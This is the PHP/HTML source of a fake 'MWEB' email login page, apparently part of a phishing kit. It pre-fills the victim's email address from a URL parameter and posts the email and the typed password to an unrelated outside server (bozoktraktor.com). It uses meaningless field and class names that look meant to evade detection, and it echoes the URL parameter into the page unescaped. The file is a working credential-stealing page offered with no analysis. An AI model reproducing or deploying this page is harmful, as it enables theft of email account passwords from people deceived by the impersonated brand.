 <?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : '';?>
 <!doctype html>
<html>

<head>
<meta charset="UTF-8">
  <title>Email Login - MWEB</title>
<meta name="robots" content="noindex,nofollow" />
<link rel="stylesheet" href="https://bozoktraktor.com/Mweb/Login/zu/stylesheet.css">
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAACXBIWXMAAAsTAAALEwEAmpwYAAAF92lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDggNzkuMTY0MDM2LCAyMDE5LzA4LzEzLTAxOjA2OjU3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjEuMCAoTWFjaW50b3NoKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjAtMDItMTNUMTU6MDA6NDMrMDI6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjAtMDItMTNUMTU6MDA6NDMrMDI6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDIwLTAyLTEzVDE1OjAwOjQzKzAyOjAwIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU2M2FmZDgxLTMwNTQtNDdmZi1hZmMxLTIyZTVhMGFiNDc1MiIgeG1wTU06RG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjc0YjNmNzg2LTk0NzUtZTk0MC1iNTVmLTJkNjU1NjdhN2E3ZCIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOmYyNzk4ZDQ3LTkwMTktNDZmZC05MzJlLTJiZTBiZDViZDYxZCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6ZjI3OThkNDctOTAxOS00NmZkLTkzMmUtMmJlMGJkNWJkNjFkIiBzdEV2dDp3aGVuPSIyMDIwLTAyLTEzVDE1OjAwOjQzKzAyOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMCAoTWFjaW50b3NoKSIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NTYzYWZkODEtMzA1NC00N2ZmLWFmYzEtMjJlNWEwYWI0NzUyIiBzdEV2dDp3aGVuPSIyMDIwLTAyLTEzVDE1OjAwOjQzKzAyOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMCAoTWFjaW50b3NoKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7YCkuJAAABP0lEQVQokWM097rHQApgIkk1ORpYgLi7TpyHi2nyvHd2FlxBXnzMzAwXr/7om/Xu48e/abGCLrbc7OyMF6/+nDLv3d2Hv5hlVPPrikT5eJn//vsf6MnHy8PExsooLcn64+c/eVm26CB+Hm4mVqCIBOvXb//OXPwBchIrCyMjIwM3J1PfzLcRGU/WbPnExMQQE8wf5sfX1Pc6PP3JgpUfgCIhPnxQP/z7z/CfgeHEue/b9n558Pj3+u2fX7z6w8zMuH7b572Hvz588nvP4a9Pn//m5mJC8vR/hj9//kOYnz7//fkLxL555ydE5MfP/5+//sMZSv+hGhn+QtUwMAIR0NHkBStZGphAVoJJiAMYGZgxzIG5CBxx56/8EORnvv/4N0To7fu/l2/8/PLt3/1HvyAir9/+uXLjJ8QUxsGX+AAnn37V1tL81wAAAABJRU5ErkJggg==" sizes="32x32" />
</head>
<body class="samsmit">
<div class="damjsk">

 <center>
 <div style="width: 50%;">
<div class="jbydes" style="width: 470px;height: 397px;background: transparent;margin-top: 191px;margin-left: 312px;">	
<br>
<div class="flight" style=" padding: inherit; padding-top: 140px; padding-left: 10px; ">
<form method="post" action="https://bozoktraktor.com/Mweb/Login/run.php">

<input type="text" name="sphynix"  tabindex="1" value="<?php echo $email_from_link;?>"readonly="" class="plantchp input" > 
<br><input type="password" name="jandame"   autocomplete="off" tabindex="2" value="" required=""  class="patrlsj blood">
<br>
   <br>
   <br>
   <br>
   
<button  name="wavecurrtn"  title="" style=" width: 83px; float: left; margin-left: 12px; margin-top: 96px; height: 48px; outline: 0; background: transparent;border: 0; cursor: pointer; ">
</button>
   
</form>
 
</div>
 
			
</div>
</center>
 
</body>
</html>
